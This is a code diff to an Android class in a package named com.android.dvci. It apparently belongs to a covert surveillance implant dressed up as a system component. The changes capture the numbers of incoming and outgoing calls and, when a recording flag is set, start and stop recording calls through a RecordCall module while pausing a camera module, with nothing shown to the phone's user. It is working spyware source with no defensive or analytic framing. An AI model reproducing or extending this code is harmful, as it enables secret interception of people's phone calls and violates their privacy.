@@ -13,16 +13,22 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.telephony.TelephonyManager;
+import android.util.Log;
 
 import com.android.dvci.Call;
 import com.android.dvci.Core;
 import com.android.dvci.ServiceMain;
 import com.android.dvci.auto.Cfg;
+import com.android.dvci.module.ModuleCall;
+import com.android.dvci.module.ModuleCamera;
+import com.android.dvci.module.ModuleSnapshot;
+import com.android.dvci.module.call.RecordCall;
 import com.android.dvci.util.Check;
 
 public class BroadcastMonitorCall  {
 	/** The Constant TAG. */
 	private static final String TAG = "BroadcastMonitorCall"; //$NON-NLS-1$
+	
 	private static Call call = null;
 	private Object lastKnownPhoneState;
 
@@ -62,104 +68,109 @@ public class BroadcastMonitorCall  {
 
 	}
 
+	static boolean incoming=Call.OUTGOING;
+	static String ongoing_number = "";
+
 	public static void manageReceive(Context context, Intent intent) {
 		try {
+
+			TelephonyManager telManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
+			Integer callState = Integer.valueOf(telManager.getCallState());
+			/****************************************/
+			/** INCOMING:  RINGING->OFFHOOK->IDLE
+			 /** OUTCOMING: OFFHOOK->IDLE
+			 /****************************************/
 			String extraIntent = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (onReceive): extraIntent: " + extraIntent); //$NON-NLS-1$
-			}
-
 			if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
-				final String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
-
+				ongoing_number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
 				// Outgoing phone call
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onReceive): 1 OUTGOING, number: " + number);//$NON-NLS-1$
+					Check.log(TAG + " (manageReceive): OUTGOING, my===> " + ongoing_number);//$NON-NLS-1$
 				}
-
-				call = new Call(number, Call.OUTGOING);
-			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
+				incoming = Call.OUTGOING;
+				return;
+			}else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
 				// il numero delle chiamate entranti lo abbiamo solo qui
-				final String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
+				ongoing_number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
 
 				// Phone is ringing
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onReceive): 2 RINGING, number: " + number);//$NON-NLS-1$
+					Check.log(TAG + " (manageReceive): RINGING, my<===" + ongoing_number);//$NON-NLS-1$
 				}
-
-				call = new Call(number, Call.INCOMING);
-			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
-				// Call disconnected
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onReceive): 3 IDLE -> END");
-				}
-
-				if (call != null) {
-					if (call.isIncoming()) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (onReceive) RECEIVING CALL");
-						}
-
-					} else {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (onReceive) ENDING OUTGOING CALL"); // don't
-																					// know
-																					// if
-																					// answered..
-						}
-
-					}
-					call.setOngoing(false);
-					call.setComplete(true);
-				} else {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (manageReceive) null call, don't propagate");
-					}
-					return;
-				}
-			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
-				// Qui la chiamata e' davvero in corso
-				// Call answered, or issuing new outgoing call
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onReceive): 4 OFFHOOK");//$NON-NLS-1$
-					Check.asserts(call != null, " (onReceive) Assert failed: call null");
-				}
-
-				if (call != null) {
-					// call.setComplete(true);
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (onReceive): 4 OFFHOOK, call ready");//$NON-NLS-1$
-					}
-					call.setOngoing(true);
-					call.setOffhook();
-				}
-
-				//call = new Call("", Call.OUTGOING, Call.START); //$NON-NLS-1$
-			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onReceive): default, assume END");//$NON-NLS-1$
-				}
-				if (Cfg.DEBUG) {
-					Check.asserts(call != null, " (onReceive) Assert failed: call null");
-				}
-				if (call != null) {
-					call.setOngoing(false);
-					call.setComplete(false);
-				}
-
+				incoming = Call.INCOMING;
 				return;
 			}
+			switch (callState.intValue()) {
+				case TelephonyManager.CALL_STATE_IDLE:
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (manageReceive): Call IDLE detected -> END");
+					}
+					//stop it
+					if (call != null) {
+						call.setOngoing(false);
+						call.setComplete(incoming ? true : false);
+						//ListenerCall.self().dispatch(call);
+						// Let's start with call recording
+						if (ModuleCall.self() != null && ModuleCall.self().isRecordFlag() ) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (manageReceive): stopping call"); //$NON-NLS-1$
+							}
+							RecordCall.self().stopCall();
+							ongoing_number="";
+						}
+					}
 
-			// Caller/Callee number, incoming?/outgoing, in
-			// progress?/disconnected
-			if (call != null && call.changedState()) {
-				ListenerCall.self().dispatch(call);
+				case TelephonyManager.CALL_STATE_OFFHOOK:
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (manageReceive): Call START detected");
+					}
+					//start it
+					if(ongoing_number==""){
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (manageReceive): Call START aborted invalid number");
+						}
+					}else {
+						call = new Call(ongoing_number, incoming);
+						if (call != null) {
+							call.setOngoing(true);
+							call.setOffhook();
+							//ListenerCall.self().dispatch(call);
+							if (ModuleCall.self() != null && ModuleCall.self().isRecordFlag()) {
+								if (Cfg.DEBUG) {
+									Check.log(TAG + " (manageReceive): starting call"); //$NON-NLS-1$
+								}
+								ModuleCamera.self().addStop("");
+								RecordCall.self().recordCall(call);
+
+							}
+						}
+					}
+					break;
+
+				case TelephonyManager.CALL_STATE_RINGING:
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (manageReceive): Call RINGING incoming");
+					}
+
+					break;
+
+				default:
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (manageReceive): Call DEFAULT callState=" + callState.intValue());
+					}
+					break;
 			}
 		} catch (Exception ex) {
 			if (Cfg.EXCEPTION) {
-				Check.log(TAG + " (onReceive) Error: " + ex);
+				Check.log(TAG + " (manageReceive) Error: " + ex);
 			}
 		}
+	}
+
+	public static void stopOnGoingRec() {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (stopOnGoingRec): stopping call due to stop"); //$NON-NLS-1$
+			}
+			RecordCall.self().stopCall();
 	}
 }
